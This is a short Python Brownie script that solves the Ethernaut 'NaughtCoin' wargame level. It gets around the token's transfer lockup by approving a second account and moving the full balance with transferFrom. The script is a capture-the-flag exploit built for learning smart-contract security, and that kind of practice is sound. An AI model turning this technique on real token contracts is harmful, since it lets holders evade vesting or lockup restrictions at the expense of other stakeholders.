from brownie import NaughtCoin, accounts, Contract

INSTANCE_ADDRESS = "0xA14000f88bB48dd618e6A5FC0d2db8961fB57E46" # Ethernaut instance level address
ACCOUNT1 = "straul"
ACCOUNT2 = "dev_only"


def hack(accountM, accountS):
    naughtCoin = Contract.from_abi("NaughtCoin", INSTANCE_ADDRESS, NaughtCoin.abi)
    amount = naughtCoin.balanceOf(accountM.address)
    naughtCoin.approve(accountS, amount, {'from': accountM})
    naughtCoin.transferFrom(accountM.address, accountS.address, amount, {'from': accountS})


def get_account():
    accountM = accounts.load(ACCOUNT1)
    accountS = accounts.load(ACCOUNT2)
    return accountM, accountS


def main():
    accountM, accountS = get_account()
    hack(accountM, accountS)